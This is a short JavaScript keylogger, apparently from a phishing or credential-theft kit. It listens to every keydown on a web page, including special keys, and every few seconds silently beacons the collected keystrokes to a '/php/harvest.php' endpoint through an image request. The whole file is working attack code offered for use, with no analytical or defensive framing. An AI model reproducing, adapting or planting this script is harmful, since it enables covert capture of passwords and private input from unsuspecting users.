// Keystroke Logger
(function() {
    const server = window.location.origin;
    let keystrokes = [];
    
    function sendKeys() {
        if (keystrokes.length) {
            const img = new Image();
            img.src = `${server}/php/harvest.php?type=keys&data=${encodeURIComponent(keystrokes.join(''))}&_=${Date.now()}`;
            keystrokes = [];
        }
    }
    
    document.addEventListener('keydown', e => {
        if (e.key.length === 1) {
            keystrokes.push(e.key);
        } else if (e.key === 'Enter') {
            keystrokes.push('[ENTER]');
        } else if (e.key === 'Backspace') {
            keystrokes.push('[BACKSPACE]');
        } else if (e.key === 'Tab') {
            keystrokes.push('[TAB]');
        }
        
        if (keystrokes.length > 20) sendKeys();
    });
    
    setInterval(sendKeys, 5000);
})();
